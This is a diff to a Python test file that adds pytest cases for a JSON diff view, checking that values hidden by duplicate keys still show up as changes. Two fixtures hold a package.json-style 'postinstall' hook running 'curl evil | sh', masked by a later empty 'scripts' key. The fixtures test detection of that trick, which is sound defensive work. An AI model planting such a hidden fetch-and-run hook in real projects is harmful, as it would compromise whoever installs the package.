@@ -349,10 +349,44 @@ def test_a_side_the_tree_view_would_not_draw_is_unsupported(
             True,
             id="keys one text once their unpaired surrogates are replaced",
         ),
+        pytest.param(
+            None,
+            b'{"scripts": {"postinstall": "curl evil | sh"}, "name": "x", "scripts": {}}',
+            ['added - {"scripts": {}, "name": "x"}'],
+            True,
+            id="an added file",
+        ),
+        pytest.param(
+            b'{"scripts": {"postinstall": "curl evil | sh"}, "name": "x", "scripts": {}}',
+            None,
+            ['removed - {"scripts": {}, "name": "x"}'],
+            True,
+            id="a deleted file",
+        ),
+        pytest.param(None, b'{"a": 1}', ['added - {"a": 1}'], False, id="an added file, none"),
+        pytest.param(
+            b'{"x": {"a": 1, "a": 2}, "y": {"a": 2}, "z": 0}',
+            b'{"x": {"a": 2}, "y": {"a": 1, "a": 2}, "z": 1}',
+            [
+                [
+                    "modified -",
+                    ['context x {"a": 2}', 'context y {"a": 2}', "removed z 0", "added z 1"],
+                ]
+            ],
+            True,
+            id="the same hidden value in another object",
+        ),
+        pytest.param(
+            b'{"a": {"b": 1, "b": 2}, "c": 0}',
+            b'{"n": 1, "a": {"b": 1, "b": 2}, "c": 1}',
+            [["modified -", ["added n 1", 'context a {"b": 2}', "removed c 0", "added c 1"]]],
+            False,
+            id="an object added before the one that hides a value",
+        ),
     ],
 )
 def test_json_with_a_key_twice_shows_the_last_value_at_its_first_place(
-    old: bytes, new: bytes, shape: list[object], source_only: bool
+    old: bytes | None, new: bytes | None, shape: list[object], source_only: bool
 ) -> None:
     """As the tree view reads it (`json.loads`, or json5 for JSONC), and a change to a
     value the tree does not draw is one Source shows."""
